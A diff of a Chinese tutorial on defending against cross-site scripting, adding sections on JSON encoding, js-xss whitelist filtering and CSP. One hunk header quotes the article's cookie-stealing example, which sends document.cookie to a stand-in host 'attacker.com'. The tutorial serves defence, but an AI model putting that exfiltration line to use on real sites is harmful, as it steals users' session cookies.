@@ -54,7 +54,7 @@ i.src = "http://attacker.com/" + document.cookie
 
 案例二：  
 有个如下的页面  
-![xss](../images/xss-2.jpeg)
+![xss](../images/xss-2.jpeg)  
 表单的ID项从URL中获取ID参数填充到文本框中，这种也是隐含着跨站脚本攻击的漏洞。
 
 黑客可以事先准备好如下URL，并作为欺诈邮件或者web页面，诱导用户去点击
@@ -168,4 +168,54 @@ sjs(`var foo = "${foo}";`)
 ```
 该库会将非数字、非字母进行转义成十六进制格式，并在前面加上`\\xx`。
 
-有时我们还需要处理json数据，json也容易被xss利用，也需要转义，egg也提供了`helper.sjon`做json encode。
+有时我们还需要处理json数据，json也容易被xss利用，也需要转义，egg也提供了`helper.sjon`做json encode，具体可以看 [egg sjson源码](https://github.com/eggjs/egg-security/blob/master/lib/helper/sjson.js)。  该库会遍历json中的每个键值对，做编码处理，因此会有一定的性能开销，要慎重使用。
+
+### 富文本输出格式化
+当页面允许用户录入页面排版、格式控制相关的HTML时，我们需要对用户的输入进行过滤和格式化，通过白名单的方式来控制允许的标签和属性。
+
+例如博客和论坛这种会有用户留言的地方，可能会被攻击者利用，输入一些而已的脚本，最终被服务器端存储起来，并被其他用户使用。页面显示时需要对这些存储的脚本进行编码或者过滤。
+
+可以参考这个库 [js-xss](https://github.com/leizongmin/js-xss)
+
+主要功能是：
+1. 通过设置一些白名单，过滤一些不合法的标签，将其从删除
+2. 过滤备注
+
+```javascript
+var str = `<a href="http://www.domain.com">google</a><script>evilcode…</script>`;
+
+const xss = require('xss');
+
+xss(str)
+// '<a href="http://www.domain.com">google</a>&lt;script&gt;evilcode…&lt;/script&gt;'
+
+xss(str, {
+  whiteList: { a: [] }
+})
+// '<a>google</a>&lt;script&gt;evilcode…&lt;/script&gt;'
+
+xss(str, {
+  whiteList: { a: [] },
+  stripIgnoreTag: true
+})
+// '<a>google</a>evilcode…'
+
+xss(str, {
+  whiteList: { a: [] },
+  stripIgnoreTagBody: true
+})
+// '<a>google</a>'
+```
+
+一定要注意 shtml 的适用场景，一般是针对来自用户的富文本输入，切忌滥用，功能既受到限制，又会影响服务端性能。 此类场景一般是论坛、评论系统等，即便是论坛等如果不支持 HTML 内容输入，也不要使用此 Helper，直接使用 escape 即可。
+
+egg框架将js-xss继承在框架中，同时它添加了针对域名的过滤，并且过滤规则更加严格，如a标签中，除了title全部过滤掉。
+
+### 通过csp进行防御
+关于csp的概念参考 [什么是csp](https://www.zhihu.com/question/21979782)
+
+主要就是通过一些请求头，定义哪些资源允许加载，不在需要我们自己来定义过滤规则或者编码规则，交给协议来做，或者说让浏览器来做。
+
+也可以通过在网页中`<meta>`标签来设置。
+
+但是这个设置需要你对csp有一定的理解，毕竟它提高了网站的复杂性。
